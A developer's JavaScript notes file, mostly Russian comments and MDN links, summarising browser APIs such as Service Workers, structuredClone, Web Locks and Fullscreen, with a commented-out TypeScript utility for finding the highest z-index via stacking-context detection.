// https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API
// https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API/Using_Service_Workers
// https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorkerGlobalScope/install_event
// https://developer.mozilla.org/en-US/docs/Web/API/ExtendableEvent
//? выступают в виде proxy, нужны для перехватки запросов, оффлайн опыт
//? background api/push notification - есть доступ к ним
//? https only, но локально можно для теста
//? полностью асинхронен и нет доступа к local/sessionstorage
//? нельзя import динамический использовать
//? indexedDb - есть


//? при вызове serviceWorker.register - сайт регистрирует/загружает воркера

//? install - только первый раз будет вызван и потом, если сервис воркер изменится
//? waitUntil - сделать логику, после которой воркер можно установить - иначе - он не будет установлен(если функция ошибкой завершится)

//? activate - только первый раз будет вызван и потом, если сервис воркер изменится

//? дальше будет загружен всегда тот же воркер до тех пор - пока ссылка на воркер не поменяется(новый файл не будет предоставлен), то есть после регистрации - при дальнейшем заходе на сайт - данный воркер будет срабатывать раньше всего - то есть воркер зарегестрировали - все - он работает в виде прокси
//? будет один для всех данных страниц
//!=============================================================================
//? /Notifications/
// https://developer.mozilla.org/en-US/docs/Web/API/Notifications_API
/*
**
***
****
*****/
//!=============================================================================
//? /StructualClone/Структурное клонирование/StructuredClone/
// https://dassur.ma/things/is-postmessage-slow/ оптимизация клонирования TODO
//https://developer.mozilla.org/en-US/docs/Web/API/structuredClone
// https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm
//? глубокое копирование, используется в postMessage, webWorker, indexedDb
//? нельзя использовать фукнции, domNodes, symbols - ошибка
//? дескрипторы свойств, прототипы - игнорируются


//? structuredClone - глобальная функция
/*
**
***
****
*****/
//!================================================================================================================================================
//? /Общение между окнами/
// https://learn.javascript.ru/cross-window-communication
/*
**
***
****
*****/
//!================================================================================================================================================
//? /Построение страницы/Работа браузера/
// https://developer.mozilla.org/ru/docs/Web/Performance/How_browsers_work
// TODO КАК работает браузера, как запускается построения DOM, в какой последовательности и т.д
/*
**
***
****
*****/
//!=============================================================================
//? /Navigator/
//? доступы к соединению, батарейке и тд


//? getBattery
//? sendBeacon
//? setAppBadge - для SPA указывает количество непрочитанных уведомлений
/*
**
***
****
*****/
//?=============================================================================
//? /Lock/
// https://developer.mozilla.org/en-US/docs/Web/API/Web_Locks_API
//? позволяет по именам регистрировать процессы, которые будут выполняться в порядке регистрации(некая очередь), то есть регистрируем 'process 1', и все остальные колбэки которые будут зарегестрированы под этим ключем будут ждать предыдущий, а если под другим ключем - будет другая очередь процессов
//? для отдельной владки в этом же источнике будет использоваться та же очередь - то есть если мы из другой вкладки добавили таски на выполнение - будем ждать пока не выполнятся все таски, добавленные до нас из другой вкладки
/*
**
***
****
*****/
//?=============================================================================
//? /Activation/
// https://developer.mozilla.org/en-US/docs/Web/API/Navigator/userActivation
//? взаимодействовал ли пользователь со страницей и статус активности
/*
**
***
****
*****/
//?=============================================================================
//? /MaxTouchPoints/
// https://developer.mozilla.org/en-US/docs/Web/API/Navigator/maxTouchPoints
//? количество пальцев поддерживаемых экраном
/*
**
***
****
*****/
//?=============================================================================
//? /Mediadevices/
// https://developer.mozilla.org/en-US/docs/Web/API/Navigator/mediaDevices
/*
**
***
****
*****/
//?=============================================================================
//? /Permission/
// https://developer.mozilla.org/en-US/docs/Web/API/Permissions_API
/*
**
***
****
*****/
//?=============================================================================
//? /Scheduling/
// https://developer.mozilla.org/en-US/docs/Web/API/Scheduling
//? Есть ли взаимодействия пользователя ожидающие выполнения
/*
**
***
****
*****/
//!=============================================================================
//? /Functions/
//? /URI/encodeURIComponent/decodeURIComponent/
//? кодирует строку в UTF-8, может выкинуть ошибку, нужно для того, чтобы преобразовать url параметр только, именно данные параметра и больше ничего



//?=============================================================================
//? /encodeURI/decodeURL/
//? может преобразовать весь url целиком и затронет только квери параметры, нужен для того, чтобы обрабатывать url целиком



//?=============================================================================
//? /URLSearchParams/
//? удобно манипулировать квери параметрами, но все пробелы превращает в + что не есть хорошо и это уходит от общего подхода, поэтому toString на нем нежелательно использовать и конструктор также преобразует данные
/*
**
***
****
*****/
//?=============================================================================
//? /Fullscreen/
//? /requestFullscreen/exitFullscreen/
//? requestFullscreen на элементе,помещает элемент в фулскрин, возврщает промис
//? exitFullscreen на документе
//? частичная поддержка

//? элемент помещенный в фулскрин должен иметь цвет бэкграунда иначе по дефолту он черный
/*
**
***
****
*****/
//?=============================================================================
//? /audio/
//? загрузка начнется только при вызове play или если выставляем pleload аттрибут
//? воспроизведение будет только когда пользователь со страницей взаимодействовал























// @mixin lineClamp($clamp: 1) {
//     /* stylelint-disable */
//     display: -webkit-box;
//     line-clamp: $clamp;
//     box-orient: vertical;
//     -webkit-line-clamp: $clamp;
//     -webkit-box-orient: vertical;
//     /* stylelint-enable */
//     overflow: hidden;
//     text-overflow: ellipsis;
//     word-break: break-word;
// }










//!=============================================================================
//? Get highest z index
/**
type KeysCreateStackingContextIfNotNone = Pick<
    CSSStyleDeclaration,
    | 'transform'
    | 'filter'
    | 'backdropFilter'
    | 'perspective'
    | 'clipPath'
    | 'mask'
    | 'maskImage'
    // | 'maskBorder' //TODO there is rule, but typings doesn't allow in to include
>

type PropertiesThatCreatesStackingContext = Pick<
    CSSStyleDeclaration,
    | 'zIndex'
    | 'containerType'
    | 'opacity'
    | 'mixBlendMode'
    | 'isolation'
    | 'contain'
    | keyof KeysCreateStackingContextIfNotNone
>

const KEYS_OBJECT_TO_NOT_BE_NONE: KeysCreateStackingContextIfNotNone = {
    transform: 'transform',
    filter: 'filter',
    backdropFilter: 'backdropFilter',
    perspective: 'perspective',
    clipPath: 'clipPath',
    mask: 'mask',
    maskImage: 'maskImage',
};

const KEYS_TO_NOT_BE_NONE = Object.keys(KEYS_OBJECT_TO_NOT_BE_NONE) as (keyof KeysCreateStackingContextIfNotNone)[];

const PROPERTIES_CREATES_Z_INDEX_CONTEXT: PropertiesThatCreatesStackingContext = {
    contain: 'contain',
    containerType: 'containerType',
    isolation: 'isolation',
    mixBlendMode: 'mixBlendMode',
    opacity: 'opacity',
    zIndex: 'zIndex',
    ...KEYS_OBJECT_TO_NOT_BE_NONE,
};

const PROPERTIES_KEYS_CREATES_Z_INDEX_CONTEXT = Object
    .keys(PROPERTIES_CREATES_Z_INDEX_CONTEXT) as (keyof PropertiesThatCreatesStackingContext)[];

const CSS_CONTAIN_VALUES_CREATES_Z_INDEX = [
    'strict',
    'paint',
    'layout',
] as const;

const CSS_DISPLAY_PARENT_VALUES = [
    'flex',
    'grid',
] as const;

export function getHighestZIndex(element: Element): number {
    const zIndexes = Array.prototype.map.call<HTMLCollection, unknown[], number[]>(
        element.children,
        (child: Element, index: number) => {
            if (doesElementCreateZIndexContext(child)) {
                const zIndex = window.getComputedStyle(child).zIndex;
                return zIndex === 'auto' ? index : Number(zIndex);
            }

            return getHighestZIndex(child);
        },
    );

    return Math.max(0, ...zIndexes.filter(value => value >= 0));
}

export function doesElementCreateZIndexContext(element: Element): boolean {
    const css = window.getComputedStyle(element);

    if (element === document.documentElement) {
        return true;
    }

    if (css.position === 'absolute' || css.position === 'relative' && css.zIndex !== 'auto') {
        return true;
    }

    if (css.position === 'fixed' || css.position === 'sticky') {
        return true;
    }

    if (css.containerType === 'size' || css.containerType === 'inline-size') {
        return true;
    }

    const parentCss = element.parentElement && window.getComputedStyle(element.parentElement);
    const parentHasFlexOrGrid = parentCss && CSS_DISPLAY_PARENT_VALUES.some(item => parentCss.display.includes(item));

    if (parentHasFlexOrGrid && css.zIndex !== 'auto') {
        return true;
    }

    if (Number(css.opacity) < 1) {
        return true;
    }

    if (css.mixBlendMode !== 'normal') {
        return true;
    }

    if (KEYS_TO_NOT_BE_NONE.some(key => css[key] != null && css[key] !== 'none')) {
        return true;
    }

    if (css.isolation === 'isolate') {
        return true;
    }

    const willChangeCondition = css.willChange
        .split(',')
        .some(key => (PROPERTIES_KEYS_CREATES_Z_INDEX_CONTEXT
            .includes(key as keyof PropertiesThatCreatesStackingContext)
        ));

    if (willChangeCondition) {
        return true;
    }

    return CSS_CONTAIN_VALUES_CREATES_Z_INDEX.some(item => css.contain.includes(item));
}
*/